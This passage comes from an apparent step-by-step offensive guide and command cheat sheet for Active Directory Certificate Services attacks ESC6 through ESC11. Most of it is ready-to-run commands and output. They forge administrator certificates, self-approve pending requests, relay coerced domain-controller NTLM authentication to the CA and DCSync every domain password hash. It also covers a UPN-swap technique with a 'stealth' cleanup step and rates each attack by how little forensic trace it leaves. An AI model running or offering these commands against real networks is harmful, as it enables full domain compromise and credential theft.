│    Template has manager approval? BYPASSED for SAN              │
└───────────────────────────────────────────────────────────────┘
```

### Visual: Flag Impact on ALL Templates

```
BEFORE flag:           AFTER flag set:
                       (EDITF_ATTRIBUTESUBJECTALTNAME2)

User template          User template
  No SAN allowed   →   SAN ALLOWED from any requester!

Machine template        Machine template
  No SAN allowed   →   SAN ALLOWED!

WebServer template      WebServer template
  Restricted SAN   →   UNRESTRICTED SAN!

CustomTemplate          CustomTemplate
  Manager approval →   SAN still requires approval BUT
                        attacker can specify SAN without
                        triggering manager approval flow
                        in many configs!

RESULT: Every single enrollable template = ESC1
```

### Step-by-Step Exploitation

**Step 1 — Confirm the flag is set**

```bash
# From Kali
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -stdout

# Certificate Authorities
#   0
#     CA Name           : Corp-CA
#     DNS Name          : ca01.corp.local
#     Web Enrollment    : Enabled
#     User Specified SAN: Enabled   ← THIS IS THE FLAG!
```

```powershell
# On CA01 or via remote registry from admin account
certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags

# Look for this line in output:
# EDITF_ATTRIBUTESUBJECTALTNAME2 -- 262144 (0x40000)
# If present → vulnerable
```

**Step 2 — Use ANY enrollable template with any SAN**

```bash
# Even the default locked-down "User" template now accepts our SAN!
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Requesting certificate via RPC
# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate and private key to 'administrator.pfx'
```

```powershell
# Windows — Certify
# Even templates WITHOUT EnrolleeSuppliesSubject now accept /altname
.\Certify.exe request \
  /ca:ca01.corp.local\Corp-CA \
  /template:User \
  /altname:administrator

# This works because the CA flag overrides the template setting!
```

**Step 3 — Authenticate and escalate**

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10

python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'
```

---

## ESC7 — Vulnerable CA Access Control

### CA Rights Hierarchy

```
┌──────────────────────────────────────────────────────────────────┐
│                    CA ACCESS CONTROL LEVELS                        │
│                                                                    │
│  LEVEL 1: CA Administrator (ManageCA)                             │
│  ────────────────────────────────────                             │
│  • Configure CA settings (set EDITF flags → ESC6!)               │
│  • Manage CA officers and enrollment agents                        │
│  • Backup and restore CA                                           │
│  • Renew CA certificate                                            │
│  • DANGER: Can enable user-specified SAN → instant ESC6           │
│                                                                    │
│  LEVEL 2: Certificate Manager (ManageCertificates)               │
│  ─────────────────────────────────────────────────                │
│  • Approve or deny PENDING certificate requests                   │
│  • Revoke issued certificates                                      │
│  • Re-issue pending requests                                       │
│  • DANGER: Can approve own pending requests (bypass approval)     │
│                                                                    │
│  LEVEL 3: Enroll                                                  │
│  ──────────────                                                    │
│  • Request certificates from templates                             │
│  • Normal user right, not dangerous on its own                    │
└──────────────────────────────────────────────────────────────────┘
```

### ESC7-1: ManageCA Attack Flow

```
lowpriv has ManageCA on Corp-CA
        │
        ▼
Enable EDITF_ATTRIBUTESUBJECTALTNAME2
(certipy ca --enable-userspecifiedsan)
        │
        ▼
Now EVERY template on Corp-CA accepts
user-supplied SAN (ESC6 conditions met)
        │
        ▼
Request cert with admin UPN via any template
        │
        ▼
Domain Admin
```

### ESC7-2: ManageCertificates Bypass Flow

```
Template "HighSecTemplate" has Manager Approval required
        │
        │  Normally: request → PENDING → waiting for CA officer
        │  With ManageCertificates: attacker IS the CA officer!
        │
        ▼
Step 1: Submit request with admin SAN → Request ID 47 (PENDING)
        │
        ▼
Step 2: certipy ca --issue-request 47 (using ManageCertificates)
        │
        ▼
Step 3: Retrieve issued certificate
        │
        ▼
Step 4: certipy auth → Domain Admin
```

### Step-by-Step Exploitation — ESC7-1

**Step 1 — Identify ManageCA rights**

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -stdout

# Certificate Authorities
#   CA Permissions
#     ManageCA              : CORP\lowpriv    ← GOT IT
#     ManageCertificates    : CORP\lowpriv
```

**Step 2 — Enable user-specified SAN flag via ManageCA**

```bash
certipy ca \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -enable-userspecifiedsan \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Successfully updated 'Corp-CA'
# [*] EDITF_ATTRIBUTESUBJECTALTNAME2 is now set
```

**Step 3 — Exploit as ESC6**

```bash
certipy req \
  -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -template 'User' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
```

### Step-by-Step Exploitation — ESC7-2

**Step 1 — Submit request that requires manager approval**

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'ApprovalRequiredTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Requesting certificate via RPC
# [*] Request ID is 47
# [-] Request is pending (would normally be stuck here)
# SAVE THIS ID: 47
```

**Step 2 — Approve your own request**

```bash
certipy ca \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -issue-request 47 \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Successfully issued certificate (Request ID 47)
```

**Step 3 — Retrieve issued certificate**

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -retrieve 47 \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate and private key to 'administrator.pfx'
```

**Step 4 — Authenticate**

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
# → Full Domain Admin
```

---

## ESC8 — NTLM Relay to ADCS HTTP

### Why This Attack is So Powerful

```
┌──────────────────────────────────────────────────────────────────┐
│                    THE NTLM RELAY CONCEPT                         │
│                                                                    │
│  NTLM = challenge-response auth protocol                          │
│  Problem: NTLM auth can be RELAYED to another server              │
│                                                                    │
│  Normal:  Client──NTLM──►Server                                  │
│  Relay:   Client──NTLM──►ATTACKER──NTLM──►Different Server       │
│                              (forwards auth transparently)        │
│                                                                    │
│  ADCS Web Enrollment accepts NTLM via HTTP (no signing!)          │
│  DC machine accounts can be coerced to authenticate via NTLM      │
│  DC machine accounts have DCSync rights                           │
│                                                                    │
│  CHAIN:                                                            │
│  Coerce DC01 → relay NTLM to /certsrv/ → cert for DC01$          │
│  → PKINIT as DC01$ → DCSync → All domain hashes                   │
└──────────────────────────────────────────────────────────────────┘
```

### Full Attack Architecture

```
ATTACKER (192.168.10.99)
      │
      │  Step 1: Start relay listener (port 445 + HTTP client)
      │
  ntlmrelayx.py ──► http://ca01.corp.local/certsrv/certfnsh.asp
      │
      │  Step 2: Coerce DC01 to authenticate to attacker
      │
  PetitPotam.py ──► DC01 (192.168.10.10)
      │
      ▼
DC01 sends NTLM auth to ATTACKER (192.168.10.99:445)
      │
      │  Step 3: Relay DC01's auth to CA01's web enrollment
      │
ATTACKER ──NTLM(DC01$)──► CA01 (192.168.10.20/certsrv/)
      │
      │  CA01 thinks it's DC01$ requesting a cert!
      │  Issues: DomainController template cert for DC01$
      │
      ▼
DC01$.pfx saved on attacker machine
      │
      │  Step 4: Authenticate with DC01$'s certificate
      │
certipy auth -pfx DC01$.pfx ──► DC01 (PKINIT)
      │
      │  DC01$ has DS-Replication rights
      │
      ▼
secretsdump.py ──► ALL domain password hashes
```

### Step-by-Step Exploitation

**Step 1 — Verify web enrollment is running**

```bash
# Check if certsrv is accessible
curl -v http://ca01.corp.local/certsrv/ 2>&1 | head -20

# ══ OUTPUT ══════════════════════════════════════════════════════
# > GET /certsrv/ HTTP/1.1
# > Host: ca01.corp.local
# < HTTP/1.1 401 Unauthorized
# < WWW-Authenticate: Negotiate
# < WWW-Authenticate: NTLM        ← NTLM is accepted
# < Content-Type: text/html

# Also via Certipy:
certipy find -u lowpriv@corp.local -p 'Password123!' -dc-ip 192.168.10.10
# Web Enrollment    : Enabled   ← VULNERABLE
```

**Step 2 — Stop local SMB and start relay**

```bash
# Stop services that use port 445
sudo systemctl stop smbd nmbd

# Start ntlmrelayx targeting ADCS
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t http://192.168.10.20/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template 'DomainController' \
  --no-http-server

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Protocol Client HTTPS loaded..
# [*] Protocol Client HTTP loaded..
# [*] Protocol Client SMB loaded..
# [*] Running in relay mode to single host
# [*] Setting up SMB Server on 192.168.10.99:445
# [*] Servers started, waiting for connections
```

**Step 3 — Coerce DC01 to authenticate to attacker**

```bash
# Open second terminal — PetitPotam (EFSRPC coercion)
python3 /opt/PetitPotam/PetitPotam.py \
  -u '' \
  -p '' \
  192.168.10.99 \
  192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# Trying pipe lsarpc
# [+] Triggering authentication via EfsRpcOpenFileRaw (opnum 0)
# [+] Got authentication from 192.168.10.10
```

```bash
# Alternative: PrinterBug (MS-RPRN)
python3 printerbug.py \
  'corp.local/lowpriv:Password123!@192.168.10.10' \
  192.168.10.99

# Alternative: DFSCoerce
python3 dfscoerce.py \
  -u '' -p '' \
  192.168.10.99 \
  192.168.10.10

# Alternative: Coercer (tries ALL methods)
coercer coerce \
  -u lowpriv -p 'Password123!' -d corp.local \
  -l 192.168.10.99 \
  -t 192.168.10.10
```

**Step 4 — Watch relay capture the certificate**

```bash
# Back in ntlmrelayx terminal:
# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] SMBD-Thread-3: Incoming connection (192.168.10.10, 50234)
# [*] SMBD-Thread-3: Connection from CORP/DC01$ authenticated
# [*] Authenticating against http://192.168.10.20/certsrv/certfnsh.asp
# [*] HTTPD: Connection from 192.168.10.99 @192.168.10.20 authenticated
# [*] Generating CSR for DC01$...
# [*] Successfully requested certificate for DC01$
# [*] Got certificate with DNS Host Name 'dc01.corp.local'
# [*] Certificate is:
#     MIIFsz...
# [*] Saved certificate to: DC01$.pfx
```

**Step 5 — Authenticate as DC01$ using the certificate**

```bash
certipy auth \
  -pfx 'DC01$.pfx' \
  -dc-ip 192.168.10.10 \
  -username 'DC01$' \
  -domain corp.local

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Using principal: DC01$@corp.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'DC01$.ccache'
# [*] Got hash for 'DC01$@corp.local':
#     aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2
```

**Step 6 — DCSync using DC machine account**

```bash
# DC machine accounts have DS-Replication privileges
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2' \
  'corp.local/DC01$@192.168.10.10'

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
# CORP\lowpriv:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
# CORP\victimuser:1106:aad3b435b51404eeaad3b435b51404ee:2a4b8cf3d9e1f2a5b4c3d2e1f0a9b8c7:::
# CORP$:1000:aad3b435b51404eeaad3b435b51404ee:abc123def456abc123def456abc123de:::
# DC01$:1001:aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2:::
# SRV01$:1002:aad3b435b51404eeaad3b435b51404ee:f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4:::
# [!] Kerberos keys grabbed
# Administrator:aes256-cts-hmac-sha1-96:...
# krbtgt:aes256-cts-hmac-sha1-96:...
# [*] $MACHINE.ACC
# [*] DPAPI_SYSTEM
```

---

## ESC9 — No Security Extension Attack

### The SID Extension Problem

```
┌──────────────────────────────────────────────────────────────────┐
│                CERTIFICATE IDENTITY BINDING                        │
│                                                                    │
│  SAFE (with security extension):                                  │
│  Certificate contains:                                             │
│    UPN = administrator@corp.local                                  │
│    SID Extension = S-1-5-21-...-500  ← Administrator's SID        │
│                                                                    │
│  DC validation:                                                    │
│    1. Extract UPN → find account "administrator"                  │
│    2. Compare SID from cert with account's SID                    │
│    3. MATCH → auth succeeds                                        │
│    4. NO MATCH → auth fails (certificate spoofing blocked!)       │
│                                                                    │
│  VULNERABLE (CT_FLAG_NO_SECURITY_EXTENSION):                      │
│  Certificate contains:                                             │
│    UPN = administrator@corp.local                                  │
│    SID Extension = (MISSING — CA didn't embed it)                 │
│                                                                    │
│  DC validation:                                                    │
│    1. Extract UPN → find account "administrator"                  │
│    2. No SID to check → fall back to UPN-only mapping             │
│    3. UPN matches → auth succeeds!                                 │
│    ← ATTACKER ABUSES THIS                                         │
└──────────────────────────────────────────────────────────────────┘
```

### The UPN Swap Attack Flow

```
ATTACKER has:
  • Account: lowpriv@corp.local (own account)
  • GenericWrite on: victimuser (another domain user)

Timeline:

T=00s: victimuser's UPN = "victimuser@corp.local"
       ┌─────────────────────────────────────────┐
T=01s: │ certipy account update                  │
       │ -user victimuser                        │
       │ -upn administrator                      │
       │ victimuser's UPN ← "administrator"      │
       └─────────────────────────────────────────┘
T=02s: ┌─────────────────────────────────────────┐
       │ certipy req                             │
       │ -u victimuser@corp.local                │
       │ -template NoSecExtTemplate              │
       │ CA issues cert:                         │
       │   UPN = "administrator" ← from UPN attr │
       │   No SID embedded (CT_FLAG_NO_SEC_EXT)  │
       └─────────────────────────────────────────┘
T=03s: ┌─────────────────────────────────────────┐
       │ certipy account update (restore)        │
       │ -user victimuser                        │
       │ -upn victimuser@corp.local              │
       │ UPN restored to normal                  │
       └─────────────────────────────────────────┘
T=04s: ┌─────────────────────────────────────────┐
       │ certipy auth -pfx victimuser.pfx        │
       │ DC: UPN = "administrator" → map to      │
       │     Administrator account               │
       │ DC: No SID to verify → UPN wins         │
       │ → TGT as administrator!                 │
       └─────────────────────────────────────────┘

Total window where victimuser had wrong UPN: ~2 seconds
```

### Step-by-Step Exploitation

**Step 1 — Find template with No Security Extension**

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable

# Look for:
# No Security Extension  : True
# Enrollment Flags       : (does NOT contain INCLUDE_SYMMETRIC_ALGORITHMS)
# Client Authentication  : True
```

**Step 2 — Verify write access on victimuser**

```bash
# Check if lowpriv can write victimuser's UPN
python3 dacledit.py \
  -action read \
  -target 'victimuser' \
  -dc-ip 192.168.10.10 \
  'corp.local/lowpriv:Password123!'

# Look for: GenericWrite or WriteProperty on User-Account-Control / User-Principal-Name
```

**Step 3 — Record original UPN**

```bash
# Get victimuser's current UPN (important for restoration)
certipy account update \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -user victimuser \
  -dc-ip 192.168.10.10
# Note: Current UPN = victimuser@corp.local
```

**Step 4 — Change victim UPN to target**

```bash
certipy account update \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -user victimuser \
  -upn administrator \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Updating user 'victimuser'
# [*] Successfully updated 'victimuser'
# victimuser's UPN is now: administrator
```

**Step 5 — Request certificate as victimuser**

```bash
# CA reads victimuser's UPN → embeds "administrator" in cert
# No SID extension → no binding to victimuser's SID
certipy req \
  -u victimuser@corp.local \
  -p 'Summer2024!' \
  -ca 'Corp-CA' \
  -template 'NoSecExtTemplate' \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Requesting certificate via RPC
# [*] Got certificate with UPN 'administrator'
# [!] Certificate object SID is empty   ← KEY: no SID embedded!
# [*] Saved certificate and private key to 'victimuser.pfx'
```

**Step 6 — Immediately restore victim UPN (stealth)**

```bash
certipy account update \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -user victimuser \
  -upn victimuser@corp.local \
  -dc-ip 192.168.10.10

# victimuser's UPN is back to normal!
# The certificate we got still has "administrator" in it
```

**Step 7 — Authenticate as administrator**

```bash
certipy auth \
  -pfx victimuser.pfx \
  -domain corp.local \
  -dc-ip 192.168.10.10

# DC checks: UPN = "administrator" → maps to Administrator account
# DC checks: SID extension? MISSING → falls back to UPN mapping
# DC issues: TGT for administrator!

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Got hash for 'administrator@corp.local':
#     aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
```

---

## ESC10 — Weak Certificate Mappings

### DC Registry Settings Explained

```
┌──────────────────────────────────────────────────────────────────┐
│  DC01 (192.168.10.10) Registry                                    │
│                                                                    │
│  HKLM\SYSTEM\CurrentControlSet\Services\Kdc\                      │
│    StrongCertificateBindingEnforcement                             │
│                                                                    │
│  Value 0 = DISABLED (totally vulnerable)                          │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ DC accepts ANY cert with matching UPN                     │   │
│  │ No SID check at all                                       │   │
│  │ ESC9 works on ANY template (even those with SID ext!)     │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                    │
│  Value 1 = COMPATIBILITY MODE (partially vulnerable)              │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ If cert has SID extension → DC validates it               │   │
│  │ If cert has NO SID extension → DC falls back to UPN only  │   │
│  │ ESC9 still works (just need a template with no SID ext)   │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                    │
│  Value 2 = FULL ENFORCEMENT (secure)                              │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ Cert MUST have SID extension                              │   │
│  │ SID in cert MUST match account SID                        │   │
│  │ No extension = auth fails                                 │   │
│  └───────────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────┘
```

### ESC10-1 Attack (StrongCertificateBindingEnforcement = 0)

```bash
# Step 1: Confirm DC is in disabled mode
Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
  $val = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc").StrongCertificateBindingEnforcement
  if ($val -eq 0 -or $null -eq $val) { "VULNERABLE: Value = $val (disabled)" }
  elseif ($val -eq 1) { "PARTIAL: Value = 1 (compat mode, ESC9 still works)" }
  else { "SAFE: Value = $val" }
}
# Output: VULNERABLE: Value = 0 (disabled)
```

```bash
# Step 2: Change victim UPN (same as ESC9)
certipy account update \
  -u lowpriv@corp.local -p 'Password123!' \
  -user victimuser \
  -upn administrator@corp.local \
  -dc-ip 192.168.10.10

# Step 3: Request cert via ANY template (enforcement disabled!)
# Even templates WITH the SID extension → DC won't check it!
certipy req \
  -u victimuser@corp.local -p 'Summer2024!' \
  -ca 'Corp-CA' -template 'User' \
  -dc-ip 192.168.10.10

# Step 4: Restore UPN
certipy account update \
  -u lowpriv@corp.local -p 'Password123!' \
  -user victimuser \
  -upn victimuser@corp.local \
  -dc-ip 192.168.10.10

# Step 5: Authenticate — DC has 0 enforcement, accepts UPN
certipy auth -pfx victimuser.pfx -domain corp.local -dc-ip 192.168.10.10
# → administrator NTLM hash
```

### ESC10-2 Attack (CertificateMappingMethods with UPN bit)

```bash
# SCHANNEL mapping method: Bit 0x4 = UPN mapping
# When set: TLS/SCHANNEL certificate auth maps by UPN

# Check current value
Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
  $val = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" -EA SilentlyContinue).CertificateMappingMethods
  "Value: $val"
  if ($val -band 0x4) { "[!] UPN mapping ENABLED - Vulnerable to ESC10-2" }
}

# Exploit: Same UPN swap technique but targeting SCHANNEL-based auth
# (e.g., LDAPS authentication using certificate)
certipy account update \
  -u lowpriv@corp.local -p 'Password123!' \
  -user victimuser \
  -upn administrator@corp.local \
  -dc-ip 192.168.10.10

certipy req -u victimuser@corp.local -p 'Summer2024!' \
  -ca 'Corp-CA' -template 'User' -dc-ip 192.168.10.10

certipy account update \
  -u lowpriv@corp.local -p 'Password123!' \
  -user victimuser -upn victimuser@corp.local -dc-ip 192.168.10.10

# Auth via PKINIT (Kerberos) or SCHANNEL (LDAPS)
certipy auth -pfx victimuser.pfx -domain corp.local -dc-ip 192.168.10.10
```

---

## ESC11 — NTLM Relay to RPC Enrollment

### Why This is More Dangerous Than ESC8

```
┌──────────────────────────────────────────────────────────────────┐
│             ESC8 vs ESC11 COMPARISON                              │
│                                                                    │
│  ESC8 (HTTP):                    ESC11 (RPC):                    │
│  ─────────────────────────────   ────────────────────────────    │
│  Requires:                       Requires:                        │
│    Web Enrollment installed  ←─  NOTHING EXTRA (always running)  │
│    Port 80/443 open              Port 135 open (always open)      │
│    IIS running                   CA service running               │
│                                                                    │
│  Most hardened orgs disable      Even if web enrollment is OFF    │
│  web enrollment after ESC8       RPC is ALWAYS available          │
│  research → not vulnerable   ←   Still vulnerable!               │
│                                                                    │
│  Attack interface:               Attack interface:                 │
│  /certsrv/certfnsh.asp           ICertRequest RPC interface       │
│  Port 80 or 443                  Port 135 + dynamic ports         │
└──────────────────────────────────────────────────────────────────┘
```

### RPC Interface Architecture

```
CA01 (192.168.10.20) Running Services:
  ┌────────────────────────────────────────────────────────────┐
  │  CERTSVC (Certificate Services)                             │
  │    │                                                        │
  │    ├── ICertRequest RPC Interface                          │
  │    │   Port: 135 (endpoint mapper) + dynamic               │
  │    │   Named Pipe: \PIPE\cert                              │
  │    │   ALWAYS RUNNING when ADCS is installed               │
  │    │   Flag IF_ENFORCEENCRYPTICERTREQUEST:                  │
  │    │     NOT SET → accepts cleartext/unauthenticated        │
  │    │     SET     → requires encrypted connections           │
  │    │                                                        │
  │    └── HTTP Web Enrollment (optional)                       │
  │        Port: 80/443 /certsrv/                              │
  │        Can be disabled (ESC8 mitigation)                   │
  └────────────────────────────────────────────────────────────┘

When IF_ENFORCEENCRYPTICERTREQUEST is NOT set:
  ➜ NTLM relay to the RPC interface works
  ➜ Attacker can relay any machine's NTLM auth
  ➜ Get certificate for that machine
  ➜ DC machine → DCSync → all hashes
```

### Step-by-Step Exploitation

**Step 1 — Confirm the flag is not set**

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10

# Certificate Authorities
#   Enforce Encryption for Requests : Disabled   ← VULNERABLE

# Manual check via certutil on CA01:
certutil -config "ca01.corp.local\Corp-CA" -getreg CA\InterfaceFlags

# If IF_ENFORCEENCRYPTICERTREQUEST (0x200) is NOT in the output = vulnerable
```

**Step 2 — Set up NTLM relay to RPC**

```bash
# ntlmrelayx with ICPR (ICertRequest) RPC mode
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t rpc://192.168.10.20 \
  -rpc-mode ICPR \
  --adcs \
  --template 'DomainController' \
  -smb2support \
  -debug

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Running in relay mode
# [*] Setting up SMB Server on 192.168.10.99:445
# [*] Setting up RPC relay to rpc://192.168.10.20
# [*] Servers started, waiting for connections
```

**Step 3 — Coerce DC01 to authenticate**

```bash
# PetitPotam
python3 /opt/PetitPotam/PetitPotam.py \
  -u '' -p '' \
  192.168.10.99 \
  192.168.10.10

# DFSCoerce (more reliable on patched systems)
python3 dfscoerce.py \
  -u '' -p '' \
  192.168.10.99 \
  192.168.10.10

# Coercer (all methods)
coercer coerce \
  -u lowpriv -p 'Password123!' -d corp.local \
  -l 192.168.10.99 \
  -t 192.168.10.10
```

**Step 4 — Certificate captured via RPC**

```bash
# ntlmrelayx output:
# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] SMBD-Thread-5: Incoming connection (192.168.10.10, 49812)
# [*] Authenticating against rpc://192.168.10.20 as CORP/DC01$
# [*] Connecting to RPC: 192.168.10.20:135
# [*] Connecting to endpoint: \PIPE\cert
# [*] Binding to ICertRequest interface
# [*] Requesting certificate for DC01$...
# [*] Certificate request ID: 51
# [*] Got certificate for DC01$!
# [*] Base64 certificate:
#     MIIFsz...
# [*] Saved certificate to: DC01$.pfx
```

**Step 5 — Authenticate and DCSync**

```bash
# Get TGT + NTLM hash as DC01$
certipy auth \
  -pfx 'DC01$.pfx' \
  -dc-ip 192.168.10.10 \
  -username 'DC01$' \
  -domain corp.local

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Got hash for 'DC01$@corp.local':
#     aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2

# DCSync — dump everything
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2' \
  'corp.local/DC01$@192.168.10.10'

# ══ OUTPUT ══════════════════════════════════════════════════════
# Administrator:500:...:58a478135a93ac3bf058a5ea0e8fdb71:::
# krbtgt:502:...:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
# [all domain hashes]
```

---

## Attack Comparison Matrix

```
╔═══════╦══════════════════════════════╦══════════════════════╦══════════╦══════════╗
║ ESC   ║ Core Technique               ║ Requirements         ║ Stealth  ║ Skill    ║
╠═══════╬══════════════════════════════╬══════════════════════╬══════════╬══════════╣
║ ESC1  ║ SAN in cert request          ║ Enroll + ESS flag    ║ Low      ║ Easy     ║
║ ESC2  ║ Any Purpose EKU              ║ Enroll + Any EKU     ║ Low      ║ Easy     ║
║ ESC3  ║ Enrollment agent chain       ║ 2 templates + enroll ║ Medium   ║ Easy     ║
║ ESC4  ║ Modify template via ACL      ║ Write on template    ║ HIGH     ║ Medium   ║
║ ESC5  ║ Add rogue CA to NTAuth       ║ Write on PKI objects ║ Medium   ║ Medium   ║
║ ESC6  ║ CA flag → all templates ESC1 ║ Any enrollable tpl   ║ Low      ║ Easy     ║
║ ESC7  ║ CA manage rights             ║ ManageCA/ManageCerts ║ Medium   ║ Easy     ║
║ ESC8  ║ NTLM relay to HTTP           ║ Web enrollment + coerce║ Low    ║ Medium   ║
║ ESC9  ║ UPN swap + no SID ext        ║ Write UPN + template ║ HIGH     ║ Medium   ║
║ ESC10 ║ Weak DC mapping enforcement  ║ Write UPN + DC config║ HIGH     ║ Medium   ║
║ ESC11 ║ NTLM relay to RPC            ║ RPC + coerce         ║ Low      ║ Medium   ║
╚═══════╩══════════════════════════════╩══════════════════════╩══════════╩══════════╝

STEALTH ratings:
  HIGH   = Attack can be performed and reversed, minimal forensic trace
  Medium = Some trace in CA audit logs but not obviously malicious
  Low    = Visible in CA audit logs, unusual cert requests stand out
```

---

## Quick Reference — All Commands

```bash
# ════════════════════════════════════════════════════
#  ENUMERATION
# ════════════════════════════════════════════════════

# Full scan for all vulnerabilities
certipy find -u lowpriv@corp.local -p 'Password123!' \
  -dc-ip 192.168.10.10 -vulnerable -stdout

# Save to files for later analysis
certipy find -u lowpriv@corp.local -p 'Password123!' \
  -dc-ip 192.168.10.10 -json -bloodhound

# Windows
.\Certify.exe find /vulnerable /showAllPermissions

# ════════════════════════════════════════════════════
#  ESC1/ESC2/ESC6 — Certificate with SAN
# ════════════════════════════════════════════════════
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -template 'TEMPLATE_NAME' \
  -upn 'administrator@corp.local' -dc-ip 192.168.10.10

# ════════════════════════════════════════════════════
#  ESC3 — Enrollment Agent
# ════════════════════════════════════════════════════
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -template 'EnrollmentAgentTemplate' \
  -dc-ip 192.168.10.10
certipy req -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -template 'User' \
  -on-behalf-of 'corp\administrator' -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10

# ════════════════════════════════════════════════════
#  ESC4 — Modify Template
# ════════════════════════════════════════════════════
certipy template -u lowpriv@corp.local -p 'Password123!' \
  -template 'TEMPLATE_NAME' -save-old -dc-ip 192.168.10.10
# → exploit as ESC1 →
certipy template -u lowpriv@corp.local -p 'Password123!' \
  -template 'TEMPLATE_NAME' -configuration TEMPLATE_NAME.json \
  -dc-ip 192.168.10.10

# ════════════════════════════════════════════════════
#  ESC7 — CA Manage Rights
# ════════════════════════════════════════════════════
certipy ca -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -enable-userspecifiedsan -dc-ip 192.168.10.10

certipy ca -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -issue-request REQUEST_ID -dc-ip 192.168.10.10

certipy ca -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -retrieve REQUEST_ID -dc-ip 192.168.10.10

# ════════════════════════════════════════════════════
#  ESC8/ESC11 — NTLM Relay
# ════════════════════════════════════════════════════
# ESC8
ntlmrelayx.py -t http://192.168.10.20/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# ESC11
ntlmrelayx.py -t rpc://192.168.10.20 -rpc-mode ICPR \
  --adcs --template DomainController -smb2support

# Coercion
